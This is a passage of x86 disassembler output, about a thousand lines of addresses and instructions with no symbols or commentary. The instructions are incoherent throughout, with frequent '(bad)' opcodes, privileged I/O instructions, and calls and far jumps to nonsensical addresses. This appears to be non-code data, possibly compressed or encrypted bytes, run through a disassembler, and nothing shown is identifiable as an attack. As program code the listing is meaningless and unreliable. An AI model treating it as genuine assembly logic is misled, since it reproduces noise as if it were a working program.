  41aded:	jl     0x41adef
  41adef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adf0:	fcom   QWORD PTR [ecx+eiz*4-0x22]
  41adf4:	fisub  WORD PTR [ecx]
  41adf6:	mov    edx,0x53d8c10d
  41adfb:	or     cl,BYTE PTR [esi]
  41adfd:	jl     0x41ade6
  41adff:	lds    esp,FWORD PTR ds:0x3bf8c37
  41ae05:	jno    0x41ae86
  41ae07:	arpl   di,sp
  41ae09:	mov    esp,DWORD PTR ds:0xe4f0432d
  41ae0f:	xor    BYTE PTR [edx+0x79],bh
  41ae12:	arpl   WORD PTR [edx+0x41],bx
  41ae15:	inc    esi
  41ae16:	shr    BYTE PTR [ebx-0x4d],cl
  41ae19:	jmp    0x6832d30c
  41ae1e:	fs xabort 0x29
  41ae22:	and    eax,0x3bd956e3
  41ae27:	dec    edi
  41ae28:	icebp  
  41ae29:	shr    al,1
  41ae2b:	outs   dx,DWORD PTR ds:[esi]
  41ae2c:	jno    0x41ade1
  41ae2e:	mov    al,ds:0xae731556
  41ae33:	inc    ebp
  41ae34:	mov    ah,0x90
  41ae36:	cmp    DWORD PTR [edi],esi
  41ae38:	or     BYTE PTR ds:0x554ff1a1,cl
  41ae3e:	cmp    dl,BYTE PTR [ecx+eax*1]
  41ae41:	(bad)  
  41ae42:	test   eax,0x74da70f0
  41ae47:	push   edx
  41ae48:	xor    BYTE PTR [eax],ah
  41ae4a:	mov    ecx,0xdcb5c001
  41ae4f:	jbe    0x41aeb2
  41ae51:	ret    0x67f7
  41ae54:	sub    eax,0xfddefb4
  41ae59:	leave  
  41ae5a:	pop    es
  41ae5b:	jno    0x41ae8f
  41ae5d:	scas   eax,DWORD PTR es:[edi]
  41ae5e:	jge    0x41ae15
  41ae60:	mov    BYTE PTR [ecx-0x2e],bh
  41ae63:	pusha  
  41ae64:	int3   
  41ae65:	pop    esi
  41ae66:	jbe    0x41aee7
  41ae68:	stos   DWORD PTR es:[edi],eax
  41ae69:	mov    dh,0xc4
  41ae6b:	data16 add al,0xf2
  41ae6e:	ds inc ebp
  41ae70:	jge    0x41aeee
  41ae72:	push   ecx
  41ae73:	adc    al,0x6a
  41ae75:	repz rcl BYTE PTR fs:[ebp+edi*2+0x61],0xa
  41ae7c:	std    
  41ae7d:	add    eax,ebp
  41ae7f:	mov    ah,0x93
  41ae81:	loope  0x41ae24
  41ae83:	imul   ecx,DWORD PTR es:0xdbeaba53,0x2d1ce8b6
  41ae8e:	or     eax,0x6ae81e31
  41ae93:	(bad)  
  41ae94:	mov    dl,0x17
  41ae96:	mov    esi,ecx
  41ae98:	xchg   ebx,eax
  41ae99:	mov    BYTE PTR [ebp+0xe],ah
  41ae9c:	inc    esi
  41ae9d:	push   ds
  41ae9e:	sahf   
  41ae9f:	aaa    
  41aea0:	mov    edi,0x8475006d
  41aea5:	add    BYTE PTR [ebx],al
  41aea7:	add    DWORD PTR [ebx+edx*8-0x5962853e],ecx
  41aeae:	lea    esp,[ebp-0x69]
  41aeb1:	add    eax,0x5d8a0cc4
  41aeb6:	nop
  41aeb7:	xor    BYTE PTR [edi-0x2dfef4e1],cl
  41aebd:	cmp    ah,bl
  41aebf:	push   cs
  41aec0:	in     eax,dx
  41aec1:	mov    ss,eax
  41aec3:	xor    DWORD PTR [ecx-0x5e],ebp
  41aec6:	shl    DWORD PTR [edx-0xf],cl
  41aec9:	and    eax,ebx
  41aecb:	inc    edi
  41aecc:	aad    0x9
  41aece:	call   0x560f917b
  41aed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aed4:	pop    esi
  41aed5:	sbb    esp,ebp
  41aed7:	sub    eax,0x84eb8539
  41aedc:	in     al,dx
  41aedd:	fadd   st,st(5)
  41aedf:	(bad)  
  41aee0:	sbb    edi,DWORD PTR [eax-0x2a14d553]
  41aee6:	xchg   edx,eax
  41aee7:	mov    al,ds:0xfd1b6ee7
  41aeec:	inc    esp
  41aeed:	ret    0xe1c0
  41aef0:	nop
  41aef1:	adc    DWORD PTR ds:0x7479fe83,ebx
  41aef7:	shl    DWORD PTR [eax+0x60],1
  41aefa:	mov    ah,0x76
  41aefc:	std    
  41aefd:	stos   BYTE PTR es:[edi],al
  41aefe:	nop
  41aeff:	inc    eax
  41af00:	int    0xf0
  41af02:	aad    0x11
  41af04:	mov    ebx,DWORD PTR [edx]
  41af06:	mov    ch,0xd3
  41af08:	into   
  41af09:	cmp    bl,dl
  41af0b:	sahf   
  41af0c:	test   eax,0x5e090d32
  41af11:	adc    edi,esp
  41af13:	lsl    ebx,WORD PTR [edi+0x80bacb4]
  41af1a:	mov    al,0x9d
  41af1c:	pusha  
  41af1d:	stos   BYTE PTR es:[edi],al
  41af1e:	inc    ecx
  41af1f:	arpl   WORD PTR [ecx+ebp*1],ax
  41af22:	mov    edi,0x96977c0d
  41af27:	call   0x3783:0x54263803
  41af2e:	and    bl,BYTE PTR [ebx-0x45]
  41af31:	test   bh,al
  41af33:	loop   0x41aefa
  41af35:	sbb    cl,BYTE PTR [ebp-0x18]
  41af38:	out    0x5b,al
  41af3a:	lock inc eax
  41af3c:	push   cs
  41af3d:	cdq    
  41af3e:	xor    BYTE PTR [eax+eax*2],ch
  41af41:	outs   dx,DWORD PTR ds:[esi]
  41af42:	mov    bl,0x44
  41af44:	out    dx,al
  41af45:	stos   BYTE PTR es:[edi],al
  41af46:	xor    esp,DWORD PTR [edi-0x69a06baa]
  41af4c:	jl     0x41aeec
  41af4e:	jg     0x41aee5
  41af50:	scas   al,BYTE PTR es:[edi]
  41af51:	or     bl,bh
  41af53:	jle    0x41af3a
  41af55:	iret   
  41af56:	push   edx
  41af57:	mov    WORD PTR [eax+0xc],ds
  41af5a:	dec    ecx
  41af5b:	iret   
  41af5c:	ret    
  41af5d:	push   es
  41af5e:	xor    bl,cl
  41af60:	aad    0x24
  41af62:	add    al,0x94
  41af64:	rol    DWORD PTR [esi-0x3d],1
  41af67:	xchg   ebp,eax
  41af68:	loope  0x41af76
  41af6a:	inc    ebx
  41af6b:	shr    ebp,0xf6
  41af6e:	cmc    
  41af6f:	and    BYTE PTR ds:0xf5f08777,0x23
  41af76:	fld    TBYTE PTR [edx+0x4f135673]
  41af7c:	inc    esi
  41af7d:	xchg   DWORD PTR [esi+0x78],esp
  41af80:	sar    BYTE PTR [ebp-0x317dd340],0x18
  41af87:	pop    eax
  41af88:	adc    DWORD PTR [esi-0x415d5ec9],eax
  41af8e:	ss add al,cl
  41af91:	sub    edi,esi
  41af93:	mov    bh,0xf
  41af95:	test   edx,ebx
  41af97:	gs sub eax,0x495d8252
  41af9d:	lahf   
  41af9e:	dec    edi
  41af9f:	mov    ebp,0xd037a6ed
  41afa4:	retf   0xa9ea
  41afa7:	in     al,0x25
  41afa9:	lods   eax,DWORD PTR ds:[esi]
  41afaa:	mov    edx,0x514c9e8f
  41afaf:	mov    ebp,0xc22a3b23
  41afb4:	and    ah,BYTE PTR [edx-0x4b]
  41afb7:	imul   ecx,DWORD PTR [esi],0xffffffcf
  41afba:	mov    ds:0x59504fb8,al
  41afbf:	sbb    esp,DWORD PTR [eax]
  41afc1:	test   al,0x9a
  41afc3:	jl     0x41af92
  41afc5:	sbb    ecx,ecx
  41afc7:	push   ebp
  41afc8:	xchg   ebx,eax
  41afc9:	(bad)
  41afcc:	adc    eax,0x82eb4962
  41afd1:	nop
  41afd2:	rcl    DWORD PTR [eax-0x17],1
  41afd5:	adc    DWORD PTR [ebx],esp
  41afd7:	rcl    BYTE PTR gs:[edi-0x1766a4c2],cl
  41afde:	jmp    0x9762:0xff9f1b98
  41afe5:	stc    
  41afe6:	das    
  41afe7:	xor    dh,dh
  41afe9:	out    dx,eax
  41afea:	and    dl,bh
  41afec:	cmp    al,0xda
  41afee:	xlat   BYTE PTR ds:[ebx]
  41afef:	jge    0x41afda
  41aff1:	mov    ecx,0xdedd4831
  41aff6:	mov    bh,0x32
  41aff8:	in     al,dx
  41aff9:	arpl   WORD PTR [ecx-0x4e],sp
  41affc:	(bad)  
  41affd:	leave  
  41affe:	fisubr WORD PTR [ebp+ebp*1-0x7dd3fda5]
  41b005:	jl     0x41b011
  41b007:	data16 mov fs,WORD PTR [esp+edi*1-0x73]
  41b00c:	out    0xf3,al
  41b00e:	or     DWORD PTR [esi+0x77],ecx
  41b011:	cs (bad) 
  41b013:	mov    eax,0x2daa8bfa
  41b018:	arpl   cx,sp
  41b01a:	arpl   WORD PTR [esi+0x36f0beda],bx
  41b020:	jg     0x41b013
  41b022:	sbb    al,0xe8
  41b024:	jge    0x41b01c
  41b026:	push   ecx
  41b027:	clc    
  41b028:	std    
  41b029:	sub    eax,0x88a7d15a
  41b02e:	cmp    dl,0x39
  41b031:	mov    ebx,?
  41b033:	jne    0x41b054
  41b035:	sbb    BYTE PTR [edx+0x42],bh
  41b038:	lods   al,BYTE PTR ds:[esi]
  41b039:	call   FWORD PTR [ebx-0x5f]
  41b03c:	aaa    
  41b03d:	xchg   edi,eax
  41b03e:	stc    
  41b03f:	push   ebp
  41b040:	mov    esp,0xcd623a68
  41b045:	popa   
  41b046:	ins    WORD PTR es:[edi],dx
  41b048:	dec    ebx
  41b049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b04a:	scas   eax,DWORD PTR es:[edi]
  41b04b:	mov    dh,0x44
  41b04d:	aad    0xed
  41b04f:	jo     0x41b0b4
  41b051:	test   bh,0xbc
  41b054:	sbb    esp,DWORD PTR [esi-0x79]
  41b057:	cmp    BYTE PTR [esi+0x78],bh
  41b05a:	cdq    
  41b05b:	mov    esi,0xf524d6b0
  41b060:	or     DWORD PTR [ebx-0x6f4a8540],edx
  41b066:	adc    dl,BYTE PTR [ecx]
  41b068:	das    
  41b069:	cmc    
  41b06a:	jns    0x41b000
  41b06c:	inc    ecx
  41b06d:	pushf  
  41b06e:	cmp    al,0x65
  41b070:	inc    ebp
  41b071:	mov    ah,0x37
  41b073:	jl     0x41b0b9
  41b075:	out    dx,eax
  41b076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b077:	aam    0x5
  41b079:	call   0x71b044b8
  41b07e:	fistp  QWORD PTR [edi+0x4e]
  41b081:	adc    al,0x7e
  41b083:	hlt    
  41b084:	and    eax,0xc0f02c34
  41b089:	repz (bad) 
  41b08b:	xchg   edi,eax
  41b08c:	fld    QWORD PTR [edx+0x4]
  41b08f:	rcl    BYTE PTR [edx+ebp*1-0x66d4d765],cl
  41b096:	lods   eax,DWORD PTR ds:[esi]
  41b097:	sar    cl,cl
  41b099:	or     eax,0x10b06946
  41b09e:	sar    BYTE PTR [esi+0x165131ce],1
  41b0a4:	jo     0x41b0aa
  41b0a6:	int3   
  41b0a7:	push   esi
  41b0a8:	sub    al,bl
  41b0aa:	sub    ecx,ebp
  41b0ac:	sbb    DWORD PTR [ebp+ebp*4-0x46],edx
  41b0b0:	xlat   BYTE PTR ds:[ebx]
  41b0b1:	jae    0x41b03d
  41b0b3:	or     ah,BYTE PTR [ecx+0x35dd98a2]
  41b0b9:	(bad)  
  41b0ba:	push   ebx
  41b0bb:	and    BYTE PTR [ebx],0x22
  41b0be:	inc    ch
  41b0c0:	gs pushf 
  41b0c2:	mov    ebp,0xed48e9cf
  41b0c7:	xor    DWORD PTR [edi],edx
  41b0c9:	cwde   
  41b0ca:	scas   eax,DWORD PTR es:[edi]
  41b0cb:	cwde   
  41b0cc:	jg     0x41b085
  41b0ce:	mov    eax,ds:0x971f6943
  41b0d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0d4:	jb     0x41b0ab
  41b0d6:	mov    dl,0xb2
  41b0d8:	dec    eax
  41b0d9:	push   ecx
  41b0da:	sub    DWORD PTR [edi],edi
  41b0dc:	push   ebx
  41b0dd:	neg    DWORD PTR [ecx+0x42bd6088]
  41b0e3:	sbb    eax,0xb2a47d39
  41b0e8:	data16 jmp 0x41b0dd
  41b0eb:	lea    esi,[esi+0x25]
  41b0ee:	je     0x41b13b
  41b0f0:	ja     0x41b11c
  41b0f2:	mov    dl,0x7
  41b0f4:	std    
  41b0f5:	daa    
  41b0f6:	jg     0x41b091
  41b0f8:	(bad)  
  41b0f9:	ja     0x41b161
  41b0fb:	call   DWORD PTR [esi]
  41b0fd:	pop    ebx
  41b0fe:	out    0x41,al
  41b100:	xchg   esi,eax
  41b101:	enter  0xa7cd,0x7e
  41b105:	loope  0x41b0b0
  41b107:	or     BYTE PTR [ebp+edi*4-0x5116dbc3],dh
  41b10e:	inc    edx
  41b10f:	mov    edi,0x2b5d50a2
  41b114:	sub    eax,0xc0aaa2e0
  41b119:	popf   
  41b11a:	push   esp
  41b11b:	xor    ebp,ebx
  41b11d:	lahf   
  41b11e:	dec    esi
  41b11f:	les    edi,FWORD PTR [ecx-0xbdef0cc]
  41b125:	and    DWORD PTR [ebx+0x3aff58b9],0x3011063f
  41b12f:	or     DWORD PTR ds:0x11c820a,0xffffff81
  41b136:	pop    ds
  41b137:	imul   ebx,DWORD PTR [edx+ebp*4+0x63],0xffffffa5
  41b13c:	fistp  WORD PTR [eax+0x28020338]
  41b142:	call   0x4d6db1ab
  41b147:	jle    0x41b180
  41b149:	sbb    eax,0x9e6d5557
  41b14e:	mov    dl,0x7d
  41b150:	sub    edi,esp
  41b152:	jle    0x41b112
  41b154:	inc    eax
  41b155:	pop    es
  41b156:	dec    ebp
  41b157:	lahf   
  41b158:	sbb    BYTE PTR ds:0xf58ea27f,bh
  41b15e:	xchg   esi,eax
  41b15f:	pusha  
  41b160:	loop   0x41b17b
  41b162:	js     0x41b166
  41b164:	jg     0x41b144
  41b166:	mov    cl,0x54
  41b168:	daa    
  41b169:	addr16 fcmovne st,st(1)
  41b16c:	test   al,0x15
  41b16e:	call   0x308e0657
  41b173:	sub    al,0xc9
  41b175:	jle    0x41b1e7
  41b177:	push   0xe1f7172e
  41b17c:	pop    eax
  41b17d:	push   eax
  41b17e:	in     al,0x2
  41b180:	sti    
  41b181:	jbe    0x41b1e0
  41b183:	in     eax,0xf2
  41b185:	push   0xffffffd7
  41b187:	or     al,0xae
  41b189:	cdq    
  41b18a:	inc    esp
  41b18b:	push   edi
  41b18c:	xor    al,0x6a
  41b18e:	jae    0x41b17d
  41b190:	add    eax,0x8251740e
  41b195:	cmp    al,0x6a
  41b197:	xchg   ecx,eax
  41b198:	iret   
  41b199:	call   0xae82:0x61e06545
  41b1a0:	repz add al,0xa9
  41b1a3:	sbb    ecx,DWORD PTR [eax-0xf]
  41b1a6:	push   ecx
  41b1a7:	pop    esi
  41b1a8:	mov    ah,BYTE PTR [edi]
  41b1aa:	aaa    
  41b1ab:	adc    BYTE PTR [ecx+0x44597216],dl
  41b1b1:	idiv   edi
  41b1b3:	fcom   QWORD PTR [ebp+0x95cef16]
  41b1b9:	mov    cl,0x5
  41b1bb:	xchg   esp,eax
  41b1bc:	rcr    DWORD PTR [ebp+ebp*4-0x31232fe8],1
  41b1c3:	ret    0x2024
  41b1c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1c7:	retf   0x7a18
  41b1ca:	add    esi,edx
  41b1cc:	js     0x41b192
  41b1ce:	push   es
  41b1cf:	or     al,0x3b
  41b1d1:	loope  0x41b211
  41b1d3:	lds    ebx,FWORD PTR [esi-0x383b1115]
  41b1d9:	xchg   edx,eax
  41b1da:	retf   0xe60
  41b1dd:	inc    ecx
  41b1de:	mov    ecx,0x26859584
  41b1e3:	stos   DWORD PTR es:[edi],eax
  41b1e4:	mov    al,ds:0xb5b9e185
  41b1e9:	xlat   BYTE PTR ds:[ebx]
  41b1ea:	jno    0x41b1cf
  41b1ec:	xor    BYTE PTR [edx+0x39b085bc],ah
  41b1f2:	xchg   DWORD PTR [eax-0x46],eax
  41b1f5:	dec    edx
  41b1f6:	push   ecx
  41b1f7:	test   al,0x4e
  41b1f9:	pop    edi
  41b1fa:	lods   al,BYTE PTR ds:[esi]
  41b1fb:	fadd   QWORD PTR [ecx]
  41b1fd:	sbb    DWORD PTR [edi+0x173e181e],eax
  41b203:	inc    ecx
  41b204:	xchg   edx,eax
  41b205:	sbb    DWORD PTR [eax+0x3a8e0cb3],edx
  41b20b:	xchg   edi,eax
  41b20c:	push   0x60
  41b20e:	push   edx
  41b20f:	leave  
  41b210:	inc    ebx
  41b211:	mov    ah,0xbb
  41b213:	icebp  
  41b214:	dec    edi
  41b215:	inc    edi
  41b216:	das    
  41b217:	adc    BYTE PTR [edx],al
  41b219:	popf   
  41b21a:	sub    BYTE PTR [ecx-0x5035c382],0x15
  41b221:	loope  0x41b20d
  41b223:	jge    0xeab21302
  41b229:	gs mov dl,0x31
  41b22c:	adc    dh,ah
  41b22e:	xchg   esi,eax
  41b22f:	repnz mov dl,ch
  41b232:	stos   BYTE PTR es:[edi],al
  41b233:	inc    esp
  41b234:	adc    al,0xba
  41b236:	inc    ebp
  41b237:	stos   DWORD PTR es:[edi],eax
  41b238:	js     0x41b1f7
  41b23a:	dec    ecx
  41b23b:	jb     0x41b251
  41b23d:	pop    edx
  41b23e:	retf   
  41b23f:	or     ch,BYTE PTR [ebx+0x1adc11a7]
  41b245:	cs stos BYTE PTR es:[edi],al
  41b247:	adc    al,0xaf
  41b249:	out    0x59,al
  41b24b:	in     eax,dx
  41b24c:	jp     0x41b29b
  41b24e:	inc    esi
  41b24f:	or     DWORD PTR [ebp-0x51],ebx
  41b252:	and    BYTE PTR [ebx-0x44],cl
  41b255:	mov    ds:0xc865d296,al
  41b25a:	jae    0x41b247
  41b25c:	pop    edx
  41b25d:	out    0x9c,eax
  41b25f:	sbb    al,0x55
  41b261:	(bad)  
  41b262:	xchg   ebp,eax
  41b263:	mov    eax,ds:0x3011ecdf
  41b268:	aas    
  41b269:	dec    esp
  41b26a:	and    BYTE PTR [eax+0x1e782c76],ah
  41b270:	icebp  
  41b271:	mov    ch,0x48
  41b273:	xor    dl,BYTE PTR ds:0x32a6d95f
  41b279:	popf   
  41b27a:	add    ch,BYTE PTR [edx]
  41b27c:	jb     0x41b2fa
  41b27e:	add    BYTE PTR [eax+0x2],bl
  41b281:	pop    es
  41b282:	data16 mov ds:0x67f48334,al
  41b288:	xchg   esi,eax
  41b289:	sbb    ebx,DWORD PTR [edi]
  41b28b:	push   es
  41b28c:	inc    ebp
  41b28d:	mov    al,bh
  41b28f:	push   ecx
  41b290:	sub    eax,0xe3265345
  41b295:	stos   DWORD PTR es:[edi],eax
  41b296:	or     ecx,ebp
  41b298:	retf   
  41b299:	div    DWORD PTR [edi+ecx*4+0x151bec8]
  41b2a0:	xchg   BYTE PTR [esi-0x69],dh
  41b2a3:	xor    BYTE PTR [esi+0x2163eff4],al
  41b2a9:	add    DWORD PTR [ecx+0x3c],edi
  41b2ac:	xlat   BYTE PTR ds:[ebx]
  41b2ad:	mov    edx,0xc561e6f7
  41b2b2:	sub    eax,0x7f1d41a8
  41b2b7:	test   ecx,0x177b9f81
  41b2bd:	call   0x9a7802d0
  41b2c2:	jno    0x41b31b
  41b2c4:	test   al,0x28
  41b2c6:	xchg   esi,eax
  41b2c7:	popf   
  41b2c8:	push   edx
  41b2c9:	rcr    DWORD PTR [eax-0x5a],1
  41b2cc:	mov    dh,0x96
  41b2ce:	and    BYTE PTR ds:0x45563910,cl
  41b2d4:	inc    esp
  41b2d5:	ret    
  41b2d6:	and    eax,0x7910c2
  41b2db:	push   cs
  41b2dc:	fadd   DWORD PTR [edi-0x37]
  41b2df:	(bad)  
  41b2e0:	jae    0x41b346
  41b2e2:	pop    ss
  41b2e3:	ins    DWORD PTR es:[edi],dx
  41b2e4:	stos   BYTE PTR es:[edi],al
  41b2e5:	fnstcw WORD PTR [eax-0x3f]
  41b2e8:	mov    DWORD PTR [eax-0x289a8e2],ecx
  41b2ee:	cmp    eax,0x97968957
  41b2f3:	pop    eax
  41b2f4:	pop    es
  41b2f5:	mov    cl,0x3a
  41b2f7:	xchg   ebp,eax
  41b2f8:	imul   DWORD PTR [eax+ecx*8-0x6116035f]
  41b2ff:	jecxz  0x41b356
  41b301:	out    0x41,al
  41b303:	shr    DWORD PTR [esi-0x26e12a32],1
  41b309:	xchg   esi,eax
  41b30a:	in     al,0x75
  41b30c:	sbb    DWORD PTR [ecx],ebp
  41b30e:	ret    0x1d2
  41b311:	fwait
  41b312:	sbb    DWORD PTR [ebx],esi
  41b314:	fisttp DWORD PTR [edx+0x17]
  41b317:	repz xchg esp,eax
  41b319:	push   ss
  41b31a:	sub    edi,edx
  41b31c:	jg     0x41b337
  41b31e:	mov    dh,0xeb
  41b320:	jle    0x41b36f
  41b322:	lock add BYTE PTR [edi-0x58],dh
  41b326:	or     eax,0xdacf3829
  41b32b:	sbb    ebp,ecx
  41b32d:	sub    DWORD PTR [ebx+0x50],esp
  41b330:	inc    ebx
  41b331:	outs   dx,DWORD PTR ds:[esi]
  41b332:	sub    al,0x6f
  41b334:	mov    ebx,0xb2f1897
  41b339:	(bad)  
  41b33b:	out    0x40,al
  41b33d:	scas   al,BYTE PTR es:[edi]
  41b33e:	and    DWORD PTR [esi+0x12],0x5536efc
  41b345:	jae    0x41b32b
  41b347:	lods   al,BYTE PTR ds:[esi]
  41b348:	jge    0x41b2ff
  41b34a:	jae    0x41b397
  41b34c:	add    eax,DWORD PTR [edi-0x2a]
  41b34f:	xor    bh,BYTE PTR [edx+0xac4d0d3]
  41b355:	pusha  
  41b356:	pop    es
  41b357:	mov    esi,0x34bc70c8
  41b35c:	fucomi st,st(6)
  41b35e:	in     al,0x70
  41b360:	jmp    0xa0e1476a
  41b365:	loope  0x41b2fc
  41b367:	daa    
  41b368:	cmp    al,BYTE PTR [esi+0x11d31b9]
  41b36e:	sbb    al,0x5a
  41b370:	sub    edi,ebp
  41b372:	sbb    dl,BYTE PTR [ebx-0x55]
  41b375:	add    ebx,ebp
  41b377:	mov    ch,0xfa
  41b379:	loope  0x41b33f
  41b37b:	adc    ch,dl
  41b37d:	out    dx,eax
  41b37e:	mov    edi,0xaab3a4dd
  41b383:	and    cl,dh
  41b385:	sub    DWORD PTR [edx+0x5d],esi
  41b388:	enter  0xbc3d,0x73
  41b38c:	jns    0x41b355
  41b38e:	mov    dl,BYTE PTR [edi+0x7]
  41b391:	and    al,0x6c
  41b393:	(bad)  
  41b394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b395:	xchg   edi,eax
  41b396:	jnp    0x41b412
  41b398:	popa   
  41b399:	icebp  
  41b39a:	lods   eax,DWORD PTR ds:[esi]
  41b39b:	sbb    al,0x64
  41b39d:	pop    eax
  41b39e:	or     eax,0x4c7aff92
  41b3a3:	popa   
  41b3a4:	loop   0x41b3fa
  41b3a6:	lock sbb al,0x31
  41b3a9:	in     eax,dx
  41b3aa:	fwait
  41b3ab:	arpl   WORD PTR [ebp+0x4c],bx
  41b3ae:	rcl    bl,cl
  41b3b0:	jle    0x41b41b
  41b3b2:	mov    dh,BYTE PTR [esi+0x77]
  41b3b5:	or     BYTE PTR [ebx-0x2f32e87b],bl
  41b3bb:	mov    esi,0x1ae36e3a
  41b3c0:	or     al,0xb6
  41b3c2:	xor    cl,ch
  41b3c4:	dec    ebx
  41b3c5:	std    
  41b3c6:	jno    0x41b3a2
  41b3c8:	jnp    0x41b3f1
  41b3ca:	or     edx,DWORD PTR [edx]
  41b3cc:	sbb    ebx,DWORD PTR [esp+eax*8-0x72d3d863]
  41b3d3:	push   edi
  41b3d4:	jbe    0x41b401
  41b3d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3d7:	mov    edi,0xc33367db
  41b3dc:	lods   al,BYTE PTR ds:[esi]
  41b3dd:	jbe    0x41b419
  41b3df:	mov    ebx,?
  41b3e1:	push   esp
  41b3e2:	test   al,0xd1
  41b3e4:	xor    al,0xcf
  41b3e6:	cmc    
  41b3e7:	mov    ebp,0x29ed66c6
  41b3ec:	cdq    
  41b3ed:	stc    
  41b3ee:	and    ch,ah
  41b3f0:	or     DWORD PTR [esi-0x6c],edx
  41b3f3:	jp     0x41b449
  41b3f5:	out    0xe3,al
  41b3f7:	sahf   
  41b3f8:	mov    al,ds:0x506ad62c
  41b3fd:	jbe    0x41b3ec
  41b3ff:	in     al,dx
  41b400:	ret    
  41b401:	jo     0x41b3d3
  41b403:	mov    eax,ds:0x11132016
  41b408:	rol    DWORD PTR [ebp+edi*4-0x346c4686],0x42
  41b410:	cwde   
  41b411:	sti    
  41b412:	inc    eax
  41b413:	push   eax
  41b414:	leave  
  41b415:	pop    ecx
  41b416:	(bad)  
  41b417:	loop   0x41b470
  41b419:	cwde   
  41b41a:	inc    ecx
  41b41b:	xchg   ebp,eax
  41b41c:	xchg   ecx,eax
  41b41d:	shl    BYTE PTR [edx],cl
  41b41f:	mov    ebp,0xff36f8ed
  41b424:	xchg   esi,eax
  41b425:	lods   eax,DWORD PTR ds:[esi]
  41b426:	pop    eax
  41b427:	scas   al,BYTE PTR es:[edi]
  41b428:	add    al,0x51
  41b42a:	es jnp 0x41b423
  41b42d:	aaa    
  41b42e:	addr16 ja 0x41b3b8
  41b431:	inc    ebp
  41b432:	dec    edx
  41b433:	es xchg esp,eax
  41b435:	shl    BYTE PTR [edx-0x40],cl
  41b438:	mov    ch,0x50
  41b43a:	addr16 xor eax,0x23a03da
  41b440:	pop    esp
  41b441:	dec    ebx
  41b442:	sbb    ebx,0x41
  41b445:	mov    WORD PTR [esi+0x1c481f64],fs
  41b44b:	bound  esi,QWORD PTR [edi+0x227e0f71]
  41b451:	jae    0x41b493
  41b453:	push   ebp
  41b454:	mov    cl,0x75
  41b456:	mov    BYTE PTR [edi+0x5cca5920],ah
  41b45c:	xor    edx,DWORD PTR [ecx-0x5e]
  41b45f:	das    
  41b460:	dec    esp
  41b461:	mov    ah,0x37
  41b463:	pop    ebp
  41b464:	in     al,dx
  41b465:	push   edi
  41b466:	push   edi
  41b467:	jns    0x41b3fe
  41b469:	pop    ebp
  41b46a:	shr    ch,cl
  41b46c:	push   esp
  41b46d:	push   edi
  41b46e:	fidiv  WORD PTR [edx+ecx*1-0x73]
  41b472:	jns    0x41b4d4
  41b474:	dec    esp
  41b475:	push   eax
  41b476:	push   ebp
  41b477:	adc    eax,0x9cf3870e
  41b47c:	arpl   WORD PTR [esi+0x10],ax
  41b47f:	imul   esi,DWORD PTR es:[edi-0x61447659],0xc0966c
  41b48a:	(bad)  
  41b48b:	cmp    al,0x63
  41b48d:	jbe    0x41b494
  41b48f:	mov    esp,0x1d508367
  41b494:	int    0x9f
  41b496:	jne    0x41b475
  41b498:	stc    
  41b499:	add    DWORD PTR [esp+ebx*1+0x30508a0c],ebx
  41b4a0:	iret   
  41b4a1:	adc    ch,BYTE PTR [edx+0x5f33b1bc]
  41b4a7:	in     al,0xed
  41b4a9:	jb     0x41b51e
  41b4ab:	stos   DWORD PTR es:[edi],eax
  41b4ac:	pushf  
  41b4ad:	(bad)  [ebx+ecx*1+0x2528d15f]
  41b4b4:	popa   
  41b4b5:	pop    edi
  41b4b6:	and    DWORD PTR [ecx-0x1],esi
  41b4b9:	jmp    0x41b506
  41b4bb:	adc    eax,0x1c5823f9
  41b4c0:	xchg   esi,eax
  41b4c1:	or     eax,eax
  41b4c3:	push   0xffffffca
  41b4c5:	dec    edi
  41b4c6:	ror    BYTE PTR [edx],cl
  41b4c8:	add    DWORD PTR [ecx],edi
  41b4ca:	les    esi,FWORD PTR [ecx+0x46]
  41b4cd:	jns    0x41b4fd
  41b4cf:	test   DWORD PTR [edx+0x2],0xaa28e214
  41b4d6:	stc    
  41b4d7:	ret    
  41b4d8:	pop    esp
  41b4d9:	mov    bl,0xcd
  41b4db:	dec    edi
  41b4dc:	aaa    
  41b4dd:	sbb    DWORD PTR [edi-0x6d],0x9fc21b86
  41b4e4:	inc    esi
  41b4e5:	daa    
  41b4e6:	cmp    al,0x7a
  41b4e8:	leave  
  41b4e9:	mov    edi,0x74935f0b
  41b4ee:	lock sub BYTE PTR [esi+0xdccccea],dl
  41b4f5:	mov    esi,DWORD PTR [ecx+ebp*1-0x22c3d5fd]
  41b4fc:	add    bh,BYTE PTR [eax-0x259a433d]
  41b502:	fmul   st(5),st
  41b504:	(bad)  [ebx]
  41b506:	inc    esi
  41b507:	in     eax,dx
  41b508:	adc    cl,bl
  41b50a:	imul   edx,DWORD PTR [esi-0x60e89acb],0xfffffff1
  41b511:	mov    dh,0xfc
  41b513:	add    al,0x1c
  41b515:	mov    dl,0x17
  41b517:	loopne 0x41b594
  41b519:	mov    ecx,0xe56839b9
  41b51e:	mov    edx,0x1938a757
  41b523:	aam    0xf7
  41b525:	loope  0x41b53c
  41b527:	push   edi
  41b528:	sub    esp,ebp
  41b52a:	in     eax,dx
  41b52b:	adc    al,0x9c
  41b52d:	ja     0x41b4df
  41b52f:	into   
  41b530:	lock cld 
  41b532:	call   0x74b858b6
  41b537:	mov    ds:0x1fc2227c,al
  41b53c:	aas    
  41b53d:	mov    edx,0xcb40ecec
  41b542:	iret   
  41b543:	int    0xe1
  41b545:	pop    ebp
  41b546:	call   0x4045:0xd319c0d5
  41b54d:	adc    BYTE PTR [edi+0x1b0c61aa],bl
  41b553:	fld    DWORD PTR [edi+0x2a]
  41b556:	push   es
  41b557:	fs cmp eax,0x510f87d4
  41b55d:	loope  0x41b59f
  41b55f:	and    edi,eax
  41b561:	out    0x99,al
  41b563:	sbb    eax,0x43a78bb9
  41b568:	adc    DWORD PTR [ecx],ebp
  41b56a:	mov    eax,ds:0xe57c36ec
  41b56f:	adc    bh,bl
  41b571:	leave  
  41b572:	inc    eax
  41b573:	pop    esi
  41b574:	inc    eax
  41b575:	xlat   BYTE PTR ds:[ebx]
  41b576:	jl     0x41b4f9
